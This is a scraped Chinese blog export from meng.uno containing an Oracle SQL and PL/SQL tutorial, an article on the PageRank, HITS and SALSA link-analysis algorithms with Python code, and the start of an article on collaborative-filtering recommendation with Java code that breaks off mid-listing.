在某些场合会使用非常大的表，比如人口信息统计表。如果一个表很大，就会降低查询的速度，并增加管理的难度。一旦发生磁盘损坏，可能整个表的数据就会丢失，恢复比较困难。根据这一情况，可以创建分区表，把一个大表分成几个区(小段)，对数据的操作和管理都可以针对分区进行，这样就可以提高数据库的运行效率。分区可以存在于不同的表空间上，提高了数据的可用性。例：创建和使用分区表。 如：创建按成绩分区的考生表，共分为3个区： CREATE TABLE 考生 ( 考号 VARCHAR2(5), 姓名 VARCHAR2(30), 成绩 NUMBER(3) ) PARTITION BY RANGE(成绩) (PARTITION A VALUES LESS THAN (300) TABLESPACE USERS, PARTITION B VALUES LESS THAN (500) TABLESPACE USERS, PARTITION C VALUES LESS THAN (MAXVALUE) TABLESPACE USERS ); 步骤3：检查A区中的考生： SELECT * FROM 考生 PARTITION(A); 步骤4：检查全部的考生： SELECT * FROM 考生; 视图 1、视图的概念 视图不同于表，视图本身不包含任何数据。而视图只是一种定义，对应一个查询语句。视图的数据都来自于某些表，这些表被称为基表。 视图可以在表能够使用的任何地方使用，但在对视图的操作上同表相比有些限制，特别是插入和修改操作。对视图的操作将传递到基表，所以在表上定义的约束条件和触发器在视图上将同样起作用。2、视图的创建 2、格式： create [or replace] view 视图名 as select 语句; 例：创建图书作者视图： CREATE VIEW 图书作者(书名,作者) AS SELECT 图书名称,作者 FROM 图书; 查询视图全部内容 SELECT * FROM 图书作者; 查询部分视图： SELECT 作者 FROM 图书作者; 删除视图： DROP VIEW 清华图书; 3．创建只读视图 创建只读视图要用WITH READ ONLY选项。 例：创建emp表的经理视图： CREATE OR REPLACE VIEW manager AS SELECT * FROM emp WHERE job= 'MANAGER' WITH READ ONLY; 4．使用WITH CHECK OPTION选项 使用WITH CHECK OPTION选项。使用该选项，可以对视图的插入或更新进行限制，即该数据必须满足视图定义中的子查询中的WHERE条件，否则不允许插入或更新。 例： CREATE OR REPLACE VIEW 清华图书 AS SELECT * FROM 图书 WHERE 出版社编号= '01' WITH CHECK OPTION;注：插入数据时，由于带了with check option的选项，则只能插入出版社编为’01’的数据 5．来自基表的限制 除了以上的限制，基表本身的限制和约束也必须要考虑。如果生成子查询的语句是一个分组查询，或查询中出现计算列，这时显然不能对表进行插入。另外，主键和NOT NULL列如果没有出现在视图的子查询中，也不能对视图进行插入。在视图中插入的数据，也必须满足基表的约束条件。 6.视图的查看 USER_VIEWS字典中包含了视图的定义。 USER_UPDATABLE_COLUMNS字典包含了哪些列可以更新、插入、删除。 USER_OBJECTS字典中包含了用户的对象。 可以通过DESCRIBE命令查看字典的其他列信息。 例：查看用户拥有的视图： SELECT object_name FROM user_objects WHERE object_type='VIEW'; Oracle第十二章——索引、同义词、数据库链接、PL/SQL语句 索引 索引(INDEX)是为了加快数据的查找而创建的数据库对象，特别是对大表，索引可以有效地提高查找速度，也可以保证数据的惟一性 创建索引一般要掌握以下原则：只有较大的表才有必要建立索引，表的记录应该大于50条，查询数据小于总行数的2%～4%。虽然可以为表创建多个索引，但是无助于查询的索引不但不会提高效率，还会增加系统开销。因为当执行DML操作时，索引也要跟着更新，这时索引可能会降低系统的性能。 创建索引： CREATE INDEX 索引名 ON 表名(列名); 删除索引： DROP INDEX 索引名； 同义词 同义词(SYNONYM)是为模式对象起的别名，可以为表、视图、序列、过程、函数和包等数据库模式对象创建同义词。 创建私有同义词： CREATE SYNONYM BOOK FOR 图书； 创建公有同义词(先要获得创建公有同义词的权限)： CREATE PUBLIC SYNONYM BOOK FOR SCOTT.图书； 删除同义词： DROP SYNONYM 同义词名； 数据库链接 数据库链接(DATABASE LINK)是在分布式环境下，为了访问远程数据库而创建的数据通信链路。 格式： CREATE DATABASE LINK 链接名 CONNECT TO 账户 IDENTIFIED BY 口令 USING 服务名; 数据库链接一旦建立并测试成功，就可以使用以下形式来访问远程用户的表。 表名@数据库链接名 PL/sql 1、块结构和基本语法要求 块中各部分的作用解释如下： (1) DECLARE：声明部分标志。 (2) BEGIN：可执行部分标志。 (3) EXCEPTION：异常处理部分标志。 (4) END；：程序结束标志。 2、输出 第一种形式： DBMS_OUTPUT.PUT(字符串表达式)； 第二种形式： DBMS_OUTPUT.PUT_LINE(字符串表达式)； 第三种形式： DBMS_OUTPUT.NEW_LINE； 3、变量赋值： 第一种形式： SELECT 列名1，列名2... INTO 变量1，变量2... FROM 表名 WHERE 条件；第二种形式：变量名:=值 例：查询雇员编号为7788的雇员姓名和工资。 SET SERVEROUTPUT ON --在命令行界面必须写 DECLARE--定义部分标识 v_name VARCHAR2(10); --定义字符串变量v_name v_sal NUMBER(5); --定义数值变量v_sal BEGIN --可执行部分标识SELECT ename,sal INTO v_name,v_sal FROM emp WHERE empno=7788;--在程序中插入的SQL语句 DBMS_OUTPUT.PUT_LINE('7788号雇员是：'||v_name||'，工资为：'||to_char(v_sal)); --输出雇员名和工资 END; 4、结合变量的定义和使用（即全局变量） 该变量是在整个SQLPlus环境下有效的变量，在退出SQLPlus之前始终有效，所以可以使用该变量在不同的程序之间传递信息。结合变量不是由程序定义的，而是使用系统命令VARIABLE定义的。** 例：定义并使用结合变量 步骤1：输入和执行下列命令，定义结合变量g_ename： --SET SERVEROUTPUT ON VARIABLE g_ename VARCHAR2(100) BEGIN :g_ename:=:g_ename|| 'Hello~ '; --在程序中使用结合变量 DBMS_OUTPUT.PUT_LINE(:g_ename); --输出结合变量的值 END; 5．记录变量的定义 还可以根据表或视图的一个记录中的所有字段定义变量，称为记录变量。记录变量包含若干个字段，在结构上同表的一个记录相同，定义方法是在表名后跟%ROWTYPE。记录变量的字段名就是表的字段名，数据类型也一致。 如： v_name emp.ename%TYPE; Oracle第十三章——PL/SQL空值语句、游标 IF语句 1、IF-THEN-END IF形式 IF 条件 then 语句集; END IF; 2、IF-THEN-ELSE-END IF形式 IF 条件 then 语句集1; ElSE 语句集2 END IF; 3．IF-THEN-ELSIF-ELSE-END IF形式 IF 条件1 THEN 语句集1; ELSIF 条件2 THEN 语句集2; ELSIF 条件3 THEN 语句集3; ... ELSE 语句集n; END IF; CASE语句 1．基本CASE结构 CASE 变量或表达式 When 值1 then 结果1; When 值2 then 结果2; When 值3 then 结果3; ... ELSE 结果n; END CASE; 2.搜索CASE结构 CASE When 条件1 then 结果1; When 条件2 then 结果2; When 条件3 then 结果3; ... ELSE 结果n; END CASE; 循环 1．基本LOOP循环 loop 语句集; exit when 条件 语句集; end loop; 2.FOR LOOP循环 FOR循环是固定次数循环，格式如下： FOR 控制变量 in [REVERSE] 下限..上限 LOOP 语句集; END LOOP; 注：循环控制变量是隐含定义的，不需要声明。 下限和上限用于指明循环次数。正常情况下循环控制变量的取值由下限到上限递增，REVERSE关键字表示循环控制变量的取值由上限到下限递减。 3．WHILE LOOP循环 while 条件 loop 语句集; end loop; 游标 1、概念 游标是SQL的一个内存工作区，由系统或用户以变量的形式定义。游标的作用就是用于临时存储从数据库中提取的数据块。在某些情况下，需要把数据从存放在磁盘的表中调到计算机内存中进行处理，最后将处理结果显示出来或最终写回数据库。这样数据处理的速度才会提高，否则频繁的磁盘数据交换会降低效率。 游标有两种类型：显式游标和隐式游标。 在前述程序中用到的SELECT…INTO…查询语句，一次只能从数据库中提取一行数据，系统都会使用一个隐式游标。 显式游标对应一个返回结果为多行多列的SELECT语句。 游标一旦打开，数据就从数据库中传送到游标变量中，然后应用程序再从游标变量中分解出需要的数据，并进行处理。 2、隐式游标属性 隐式游标的属性 返回值类型 意义 SQL%ROWCOUNT 整型 代表DML语句成功执行的数据行数 SQL%FOUND 布尔型 值为TRUE代表插入、删除、更新或单行查询操作成功 SQL%NOTFOUND 布尔型 与SQL%FOUND属性返回值相反 SQL%ISOPEN 布尔型 DML执行过程中为真，结束后为假 如：使用隐式游标的属性，判断对雇员工资的修改是否成功。 SET SERVEROUTPUT ON BEGIN UPDATE emp SET sal=sal+100 WHERE empno=1234; IF SQL%FOUND THEN DBMS_OUTPUT.PUT_LINE('成功修改雇员工资！'); COMMIT; ELSEDBMS_OUTPUT.PUT_LINE('修改雇员工资失败！'); END IF; END; 3、显式游标 游标的使用分成以下4个步骤。 a．声明游标 在DECLEAR部分按以下格式声明游标： CURSOR 游标名[(参数1 数据类型[，参数2 数据类型...])] IS SELECT语句; 参数是可选部分，所定义的参数可以出现在SELECT语句的WHERE子句中。如果定义了参数，则必须在打开游标时传递相应的实际参数。 b.打开游标 在可执行部分，按以下格式打开游标： OPEN 游标名[(实际参数1[，实际参数2...])]; 打开游标时，SELECT语句的查询结果就被传送到了游标工作区。 c.提取数据 在可执行部分，按以下格式将游标工作区中的数据取到变量中。提取操作必须在打开游标之后进行。 FETCH 游标名 INTO 变量名1[，变量名2...]; 或 FETCH 游标名 INTO 记录变量; 游标打开后有一个指针指向数据区，FETCH语句一次返回指针所指的一行数据，要返回多行需重复执行，可以使用循环语句来实现。控制循环可以通过判断游标的属性来进行。 定义记录变量的方法如下： 变量名 表名|游标名%ROWTYPE； d.关闭游标 CLOSE 游标名; 显式游标打开后，必须显式地关闭。游标一旦关闭，游标占用的资源就被释放，游标变成无效，必须重新打开才能使用。 【例1】 用游标提取emp表中7788雇员的名称和职务。 SET SERVEROUTPUT ON --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句 DECLARE v_ename VARCHAR2(10); v_job VARCHAR2(10); CURSOR emp_cursor IS SELECT ename,job FROM emp WHERE empno=7788; BEGIN OPEN emp_cursor; FETCH emp_cursor INTO v_ename,v_job; DBMS_OUTPUT.PUT_LINE(v_ename||','||v_job); CLOSE emp_cursor; END; 【例2】 用游标提取emp表中7788雇员的姓名、职务和工资。 SET SERVEROUTPUT ON --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句 DECLARE CURSOR emp_cursor IS SELECT ename,job,sal FROM emp WHERE empno=7788; emp_record emp_cursor%ROWTYPE; --用游标定义记录变量 BEGIN OPEN emp_cursor; FETCH emp_cursor INTO emp_record; DBMS_OUTPUT.PUT_LINE(emp_record.ename||','|| emp_record.job||','|| emp_record.sal); CLOSE emp_cursor; END; 【例3】 显示工资最高的前3名雇员的名称和工资。 SET SERVEROUTPUT ON --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句 DECLARE V_ename VARCHAR2(10); V_sal NUMBER(5); CURSOR emp_cursor IS SELECT ename,sal FROM emp ORDER BY sal DESC; BEGIN OPEN emp_cursor; FOR I IN 1..3 LOOP FETCH emp_cursor INTO v_ename,v_sal; DBMS_OUTPUT.PUT_LINE(v_ename||','||v_sal); END LOOP; CLOSE emp_cursor; END; 4、游标循环（重点） 方法一：使用特殊的FOR循环形式显示全部雇员的编号和名称(省略掉定义记录变量、打开游标、提取数据、关闭游标)。 SET SERVEROUTPUT ON --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句 DECLARE CURSOR emp_cursor IS SELECT empno, ename FROM emp; BEGIN FOR Emp_record IN emp_cursor LOOP DBMS_OUTPUT.PUT_LINE(Emp_record.empno|| Emp_record.ename); END LOOP; END; 方法二：最简单方式 SET SERVEROUTPUT ON --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句 BEGIN FOR re IN (SELECT ename FROM EMP) LOOP DBMS_OUTPUT.PUT_LINE(re.ename) END LOOP; END; 5、利用游标属性做循环条件 【训练1】 使用游标的属性练习。 SET SERVEROUTPUT ON --在命令行界面是必须的，在第三方工具的SQL界面中无需此语句 DECLARE V_ename VARCHAR2(10); CURSOR emp_cursor IS SELECT ename FROM emp; BEGIN OPEN emp_cursor; IF emp_cursor%ISOPEN THEN LOOP FETCH emp_cursor INTO v_ename; EXIT WHEN emp_cursor%NOTFOUND; DBMS_OUTPUT.PUT_LINE(to_char(emp_cursor%ROWCOUNT)||'-'||v_ename); END LOOP; ELSE DBMS_OUTPUT.PUT_LINE('用户信息：游标没有打开！'); END IF; CLOSE emp_cursor; END; Oracle第十四章——游标、存储过程 游标参数的传递 例： SET SERVEROUTPUT ON DECLARE V_empno NUMBER(5); V_ename VARCHAR2(10); CURSOR emp_cursor(p_deptno NUMBER,p_job VARCHAR2) IS SELECT empno,ename FROM emp WHERE deptno = p_deptno AND job = p_job; BEGIN OPEN emp_cursor(10, 'CLERK'); LOOP FETCH emp_cursor INTO v_empno,v_ename; EXIT WHEN emp_cursor%NOTFOUND; DBMS_OUTPUT.PUT_LINE(v_empno||','||v_ename); END LOOP; END; 异常处理 错误处理的语法如下： EXCEPTION WHEN 错误1[OR 错误2] THEN 语句序列1; WHEN 错误3[OR 错误4] THEN 语句序列2; ... WHEN OTHERS 语句序列n; END; 例：SET SERVEROUTPUT ON DECLARE v_name VARCHAR2(10); BEGIN SELECT ename INTO v_name FROM emp WHERE empno = 1234; DBMS_OUTPUT.PUT_LINE('该雇员名字为：'|| v_name); EXCEPTION WHEN NO_DATA_FOUND THEN DBMS_OUTPUT.PUT_LINE('编号错误，没有找到相应雇员！'); WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE('发生其他错误！'); END; 存储过程 创建和删除存储过程 格式： CREATE [OR REPLACE] PROCEDURE 存储过程名[(参数[IN|OUT|IN OUT] 数据类型...)] {AS|IS} [说明部分] --定义需要使用的临时变量 BEGIN 语句集; [EXCEPTION] [错误处理部分] END [过程名]; 删除： drop procedure 存储过程名; 调用存储过程 方法1： EXECUTE 模式名.存储过程名[(参数...)]; (适用于命今行窗口及sql窗口) 方法2： (适用于sql窗口) BEGIN 模式名.存储过程名[(参数...)]; END; 例：编写显示雇员信息的存储过程EMP_LIST，并引用EMP_COUNT存储过程(无参存储过程 )。 CREATE OR REPLACE PROCEDURE EMP_LIST AS CURSOR emp_cursor IS SELECT empno,ename FROM emp; BEGIN FOR Emp_record IN emp_cursor LOOP DBMS_OUTPUT.PUT_LINE(Emp_record.empno||Emp_record.ename); END LOOP; EMP_COUNT; END; 调用：begin EMP_LIST; end; 参数传递 a.输入参数: 参数名 IN 数据类型 DEFAULT 值； 例：编写给雇员增加工资的存储过程CHANGE_SALARY，通过IN类型的参数传递要增加工资的雇员编号和增加的工资额。 CREATE OR REPLACE PROCEDURE CHANGE_SALARY(P_EMPNO IN NUMBER DEFAULT 7788,P_RAISE NUMBER DEFAULT 10) --形参P_EMPNO及P_RAISE AS V_ENAME VARCHAR2(10); V_SAL NUMBER(5); BEGIN SELECT ENAME,SAL INTO V_ENAME,V_SAL FROM EMP WHERE EMPNO=P_EMPNO; UPDATE EMP SET SAL=SAL+P_RAISE WHERE EMPNO=P_EMPNO; DBMS_OUTPUT.PUT_LINE('雇员'||V_ENAME||'的工资被改为'||TO_CHAR(V_SAL+P_RAISE)); COMMIT; EXCEPTION WHEN OTHERS THEN DBMS_OUTPUT.PUT_LINE('发生错误，修改失败！'); ROLLBACK; --如果出了异常则撤消 END; 调用：begin CHANGE_SALARY(7788,80) end; b.输出参数: 参数名 OUT 数据类型 DEFAULT 值； --例：统计雇员的人数 CREATE OR REPLACE PROCEDURE EMP_COUNT(P_TOTAL OUT NUMBER) --P_TOTAL为输出参数 AS BEGIN SELECT COUNT(*) INTO P_TOTAL FROM EMP; END; 调用：DECLARE V_EMPCOUNT NUMBER; --定义变量接收过程求出的结果 BEGIN EMP_COUNT(V_EMPCOUNT); DBMS_OUTPUT.PUT_LINE('雇员总人数为：'||V_EMPCOUNT); END; c.输入输出参数： 参数名 IN OUT 数据类型 DEFAULT 值； --例：使用IN OUT类型的参数，给电话号码增加区码。 CREATE OR REPLACE PROCEDURE ADD_REGION(P_HPONE_NUM IN OUT VARCHAR2) AS BEGIN P_HPONE_NUM:='024-'||P_HPONE_NUM; END; 调用： DECLARE V_PHONE_NUM VARCHAR2(15); BEGIN V_PHONE_NUM:='26731092'; ADD_REGION(V_PHONE_NUM); DBMS_OUTPUT.PUT_LINE('新的电话号码：'||V_PHONE_NUM); END; 本文链接： http://www.meng.uno/articles/33c755f8/ 欢迎转载！","categories":[{"name":"Java开发Tips","slug":"Java开发Tips","permalink":"http://www.meng.uno/categories/Java开发Tips/"}],"tags":[{"name":"Java","slug":"Java","permalink":"http://www.meng.uno/tags/Java/"},{"name":"Oracle","slug":"Oracle","permalink":"http://www.meng.uno/tags/Oracle/"}]},{"title":"几个常见的社区推荐算法","slug":"weibo-friends","date":"2018-03-18T11:03:48.000Z","updated":"2018-03-18T13:39:36.183Z","comments":true,"path":"articles/82a6b55c/","link":"","permalink":"http://www.meng.uno/articles/82a6b55c/","excerpt":"PageRank算法 PageRank算法预先给每个网页一个PR值（PR值指代PageRank值），PR值在物理意义上为一个网页被访问的概率，所以一般是1/N，其中N为网页总数。 另外，所有网页的PR值的和一般为1。（如果实在不为1也不是不行，最后算出来的不同网页之间PR值的大小关系仍然是正确的，只是这个数值不能直接地反映概率罢了。） 接着，运用下面的算法不断迭代计算，直至达到平稳分布为止。 普通情况 互联网中的众多网页可以看成一个有向图，箭头的指向即为链接的链入，根据上图，我们得到A的PR值为：PR(A)=PR(B)/2+PR©/1。 没有出链 网络中不乏一些没有出链的网页，","text":"PageRank算法 PageRank算法预先给每个网页一个PR值（PR值指代PageRank值），PR值在物理意义上为一个网页被访问的概率，所以一般是1/N，其中N为网页总数。 另外，所有网页的PR值的和一般为1。（如果实在不为1也不是不行，最后算出来的不同网页之间PR值的大小关系仍然是正确的，只是这个数值不能直接地反映概率罢了。） 接着，运用下面的算法不断迭代计算，直至达到平稳分布为止。 普通情况 互联网中的众多网页可以看成一个有向图，箭头的指向即为链接的链入，根据上图，我们得到A的PR值为：PR(A)=PR(B)/2+PR©/1。 没有出链 网络中不乏一些没有出链的网页，如上图，其中，网页C没有出链，也就是说网页C对其他网页没有PR值的贡献，我们不喜欢这种“自私”的网页（其实是为了满足 Markov 链的收敛性），于是设定其对所有网页（包括它自己）都有出链，则此图中A的PR值表示为：PR(A)=PR(B)/2+PR©/4。 出链循环圈 网络中还存在这样的网页：只对自己有出链，或者几个网页的出链形成一个循环圈。那么在不断迭代的过程中，这一个或几个网页的PR值将只增不减，这显然是不合理的。 那么如何解决这个问题呢？我们假设某人正在浏览网页C，显然他不会一直停留在网页C，他可能会随机地输入一个网址从而去往另一个网页，并且其跳转到每个网页的概率是一样的。于是此图中A的PR值表示为：PR(A)=∂(PR(B)/2)+(1-∂)/4。 综上，一般情况下，一个网页的PR值计算公式如下： 其中，Mpi是所有对pi网页有出链的网页集合，L(pj)是网页pj的出链数目，N是网页总数，α一般取0.85。 根据上面的公式，我们就可以计算出每个网页的PR值，在不断迭代并趋于平稳的时候，即为最终结果。 HITS算法 算法简介： 首先把那些根据关键相关返回网页作为根集合S，再由S集合网页节点的链入和链出网页节点派生出结合C，结合C包括S，链入和链出节点集合。 C中的每个节点分配一对权重&lt;h(s),a(s)&gt;, 节点h(s)权重由节点链出的节点的a(s)决定，a(s)由节点的链入节点的h(s)决定。 算法过程： 网页的a权重向量： 关于HITS算法收敛性，可以从如下变换形式来得出： 当算法收敛时候，a其实就是对应矩阵A那个最大特征值对应的特征向量的归一化形式，同样，h也是H矩阵那个最大特征值对应的特征向量的归一化形式。 算法实现： 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485 class HITSIterator: __doc__ = '''计算一张图中的hub,authority值''' def __init__(self, dg): self.max_iterations = 100 # 最大迭代次数 self.min_delta = 0.0001 # 确定迭代是否结束的参数 self.graph = dg self.hub = &#123;&#125; self.authority = &#123;&#125; for node in self.graph.nodes(): self.hub[node] = 1 self.authority[node] = 1 def hits(self): \"\"\" 计算每个页面的hub,authority值 :return: \"\"\" if not self.graph: return flag = False for i in range(self.max_iterations): change = 0.0 # 记录每轮的变化值 norm = 0 # 标准化系数 tmp = &#123;&#125; # 计算每个页面的authority值 tmp = self.authority.copy() for node in self.graph.nodes(): self.authority[node] = 0 for incident_page in self.graph.incidents(node): # 遍历所有“入射”的页面 self.authority[node] += self.hub[incident_page] norm += pow(self.authority[node], 2) # 标准化 norm = sqrt(norm) for node in self.graph.nodes(): self.authority[node] /= norm change += abs(tmp[node] - self.authority[node]) # 计算每个页面的hub值 norm = 0 tmp = self.hub.copy() for node in self.graph.nodes(): self.hub[node] = 0 for neighbor_page in self.graph.neighbors(node): # 遍历所有“出射”的页面 self.hub[node] += self.authority[neighbor_page] norm += pow(self.hub[node], 2) # 标准化 norm = sqrt(norm) for node in self.graph.nodes(): self.hub[node] /= norm change += abs(tmp[node] - self.hub[node]) print(\"This is NO.%s iteration\" % (i + 1)) print(\"authority\", self.authority) print(\"hub\", self.hub) if change &lt; self.min_delta: flag = True break if flag: print(\"finished in %s iterations!\" % (i + 1)) else: print(\"finished out of 100 iterations!\") print(\"The best authority page: \", max(self.authority.items(), key=lambda x: x[1])) print(\"The best hub page: \", max(self.hub.items(), key=lambda x: x[1]))if __name__ == '__main__': dg = digraph() dg.add_nodes([\"A\", \"B\", \"C\", \"D\", \"E\"]) dg.add_edge((\"A\", \"C\")) dg.add_edge((\"A\", \"D\")) dg.add_edge((\"B\", \"D\")) dg.add_edge((\"C\", \"E\")) dg.add_edge((\"D\", \"E\")) dg.add_edge((\"B\", \"E\")) dg.add_edge((\"E\", \"A\")) hits = HITSIterator(dg) hits.hits() SALSA算法 SALSA算法和HITS算法初始部分一样，构建相同的集合集C和彼此的链接关系。 SALSA一种随机游走过程，但是不同经典的随机游走。它涉及到把一个网页节点看成2种不同类型节点：hub和authority，随机游走对应着这样两种不用类型的Markov链：hub链和authority链，状态转移为网页前向和后向。 首先是把构建一个无向图，原图节点分为2类，然后构建边。 这样从某个节点出发，进行两个方向的随机游走。h和a方向的状态转移矩阵： 对于以上的形式可以通过如下的矩阵相乘的方式展现： 有了H和A矩阵，就可以知道节点集合最终的h和a向量：和HITS一样，h和a对应H和A的最大特征值对应的归一化特征向量。其实，计算h和a可以参照HITS，进行迭代求解。 本文链接： http://www.meng.uno/articles/82a6b55c/ 欢迎转载！","categories":[{"name":"机器学习","slug":"机器学习","permalink":"http://www.meng.uno/categories/机器学习/"}],"tags":[{"name":"推荐","slug":"推荐","permalink":"http://www.meng.uno/tags/推荐/"},{"name":"社交网络","slug":"社交网络","permalink":"http://www.meng.uno/tags/社交网络/"}]},{"title":"商品推荐：协同过滤","slug":"recommendation","date":"2018-03-17T06:05:52.000Z","updated":"2018-03-18T07:18:29.430Z","comments":true,"path":"articles/6f93935a/","link":"","permalink":"http://www.meng.uno/articles/6f93935a/","excerpt":"过去很长时间以及现今，电商都在蓬勃发展，支持电商越做越大的一个很重要的因素就是“商品推荐”。当我们打开天猫，我们发现不同的用户，一般而言，首页是不一样的，原因就是，它为不同的用户推荐了不同的商品。我们为什么要用某一个购物网站或者APP，我觉得很大程度上取决于其推荐的准确与否。本篇博客我将向大家介绍协同过滤在商品推荐上的应用。 关于推荐系统 根据推荐引擎的数据源不同，一般而言，推荐系统可以分为如下三类： * 基于人口统计学的推荐机制（Demographic-based Recommendation）：根据系统用户的基本信息发现用户的相关程度。 * 基于内容的推荐机制（Content","text":"过去很长时间以及现今，电商都在蓬勃发展，支持电商越做越大的一个很重要的因素就是“商品推荐”。当我们打开天猫，我们发现不同的用户，一般而言，首页是不一样的，原因就是，它为不同的用户推荐了不同的商品。我们为什么要用某一个购物网站或者APP，我觉得很大程度上取决于其推荐的准确与否。本篇博客我将向大家介绍协同过滤在商品推荐上的应用。 关于推荐系统 根据推荐引擎的数据源不同，一般而言，推荐系统可以分为如下三类： 基于人口统计学的推荐机制（Demographic-based Recommendation）：根据系统用户的基本信息发现用户的相关程度。 基于内容的推荐机制（Content-based Recommendation）：根据推荐物品或内容的元数据，发现物品或者内容的相关性。 协同过滤的推荐机制（Collaborative Filtering-based Recommendation）：根据用户对物品或者信息的偏好，发现物品或者内容本身的相关性，或者是发现用户的相关性。 根据推荐模型的建立方式不同，推荐系统可以分为这样三类： 基于物品和用户本身。这种推荐引擎将每个用户和每个物品都当作独立的实体，预测每个用户对于每个物品的喜好程度，这些信息往往是用一个二维矩阵描述的。由于用户感兴趣的物品远远小于总物品的数目，这样的模型导致大量的数据空置，即我们得到的二维矩阵往往是一个很大的稀疏矩阵。同时为了减小计算量，我们可以对物品和用户进行聚类， 然后记录和计算一类用户对一类物品的喜好程度，但这样的模型又会在推荐的准确性上有损失。 基于关联规则的推荐（Rule-based Recommendation）。关联规则的挖掘已经是数据挖掘中的一个经典的问题，主要是挖掘一些数据的依赖关系，典型的场景就是“购物篮问题”，通过关联规则的挖掘，我们可以找到哪些物品经常被同时购买，或者用户购买了一些物品后通常会购买哪些其他的物品，当我们挖掘出这些关联规则之后，我们可以基于这些规则给用户进行推荐。 基于模型的推荐（Model-based Recommendation）。这是一个典型的机器学习的问题，可以将已有的用户喜好信息作为训练样本，训练出一个预测用户喜好的模型，这样以后用户在进入系统，可以基于此模型计算推荐。这种方法的问题在于如何将用户实时或者近期的喜好信息反馈给训练好的模型，从而提高推荐的准确度。 协同过滤 关于协同过滤的一个最经典的例子就是看电影，有时候不知道哪一部电影是我们喜欢的或者评分比较高的，那么通常的做法就是问问周围的朋友，看看最近有什么好的电影推荐。在问的时候，都习惯于问跟自己口味差不多的朋友，这就是协同过滤的核心思想。 步骤 要实现协同过滤，一般需要这样三步： 收集用户偏好 找到相似物或人 计算并推荐 收集用户偏好 从用户的行为和偏好中发现规律，并基于此进行推荐，所以如何收集用户的偏好信息成为系统推荐效果最基础的决定因素。用户有很多种方式向系统提供自己的偏好信息，比如：评分，投票，转发，保存书签，购买，点击流，页面停留时间等等。 当然，得到原始数据之后，我们总是需要进行降噪、归一化等，在此不再赘述。 找到相似物或人 既然是找相似，我们就需要设定一个计算相似度的指标，一般而言，余弦相似度与皮尔逊相关系数是很好的选择。 余弦相似度 皮尔逊相关系数 皮尔逊相关也称为积差相关（或积矩相关）是英国统计学家皮尔逊于20世纪提出的一种计算直线相关的方法。 假设有两个变量X、Y，那么两变量间的皮尔逊相关系数可通过以下公式计算： 计算并推荐 基于用户的协同过滤推荐 基于用户的协同过滤推荐的基本原理是，根据所有用户对物品或者信息的偏好，发现与当前用户口味和偏好相似的“邻居”用户群，在一般的应用中是采用计算“K- 邻居”的算法；然后，基于这 K 个邻居的历史偏好信息，为当前用户进行推荐。 上图示意出基于用户的协同过滤推荐机制的基本原理，假设用户 A 喜欢物品 A，物品 C，用户 B 喜欢物品 B，用户 C 喜欢物品 A ，物品 C 和物品 D；从这些用户的历史喜好信息中，我们可以发现用户 A 和用户 C 的口味和偏好是比较类似的，同时用户 C 还喜欢物品 D，那么我们可以推断用户 A 可能也喜欢物品 D，因此可以将物品 D 推荐给用户 A。 基于用户的协同过滤推荐机制和基于人口统计学的推荐机制都是计算用户的相似度，并基于“邻居”用户群计算推荐，但它们所不同的是如何计算用户的相似度，基于人口统计学的机制只考虑用户本身的特征，而基于用户的协同过滤机制可是在用户的历史偏好的数据上计算用户的相似度，它的基本假设是，喜欢类似物品的用户可能有相同或者相似的口味和偏好。 基于项目的协同过滤推荐 基于项目的协同过滤推荐的基本原理也是类似的，只是说它使用所有用户对物品或者信息的偏好，发现物品和物品之间的相似度，然后根据用户的历史偏好信息，将类似的物品推荐给用户。 假设用户 A 喜欢物品 A 和物品 C，用户 B 喜欢物品 A，物品 B 和物品 C，用户 C 喜欢物品 A，从这些用户的历史喜好可以分析出物品 A 和物品 C 时比较类似的，喜欢物品 A 的人都喜欢物品 C，基于这个数据可以推断用户 C 很有可能也喜欢物品 C，所以系统会将物品 C 推荐给用户 C。 与上面讲的类似，基于项目的协同过滤推荐和基于内容的推荐其实都是基于物品相似度预测推荐，只是相似度计算的方法不一样，前者是从用户历史的偏好推断，而后者是基于物品本身的属性特征信息。 基于模型的协同过滤推荐 基于模型的协同过滤推荐就是基于样本的用户喜好信息，训练一个推荐模型，然后根据实时的用户喜好的信息进行预测，计算推荐。 基于协同过滤的推荐机制是现今应用最为广泛的推荐机制，它有以下几个显著的优点： 它不需要对物品或者用户进行严格的建模，而且不要求物品的描述是机器可理解的，所以这种方法也是领域无关的。 这种方法计算出来的推荐是开放的，可以共用他人的经验，很好的支持用户发现潜在的兴趣偏好 而它也存在以下几个问题： 方法的核心是基于历史数据，所以对新物品和新用户都有“冷启动”的问题。 推荐的效果依赖于用户历史偏好数据的多少和准确性。 在大部分的实现中，用户历史偏好是用稀疏矩阵进行存储的，而稀疏矩阵上的计算有些明显的问题，包括可能少部分人的错误偏好会对推荐的准确度有很大的影响等等。 对于一些特殊品味的用户不能给予很好的推荐。 由于以历史数据为基础，抓取和建模用户的偏好后，很难修改或者根据用户的使用演变，从而导致这个方法不够灵活。 代码实现 基于用户的CF： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112 import java.util.HashMap;import java.util.HashSet;import java.util.Iterator;import java.util.Map;import java.util.Map.Entry;import java.util.Scanner;import java.util.Set;/** * 基于用户的协同过滤推荐算法实现 A a b d B a c C b e D c d e * @author Administrator * */public class UserCF &#123; public static void main(String[] args) &#123; /** * 输入用户--&gt;物品条目 一个用户对应多个物品 * 用户ID 物品ID集合 * A a b d * B a c * C b e * D c d e */ Scanner scanner = new Scanner(System.in); System.out.println(\"Input the total users number:\"); //输入用户总量 int N = scanner.nextint(); int[][] sparseMatrix = new int[N][N]; //建立用户稀疏矩阵，用于用户相似度计算【相似度矩阵】 Map&lt;String, Integer&gt; userItemLength = new HashMap&lt;&gt;(); //存储每一个用户对应的不同物品总数 eg: A 3 Map&lt;String, Set&lt;String&gt;&gt; itemUserCollection = new HashMap&lt;&gt;(); //建立物品到用户的倒排表 eg: a A B Set&lt;String&gt; items = new HashSet&lt;&gt;(); //辅助存储物品集合 Map&lt;String, Integer&gt; userID = new HashMap&lt;&gt;(); //辅助存储每一个用户的用户ID映射 Map&lt;Integer, String&gt; idUser = new 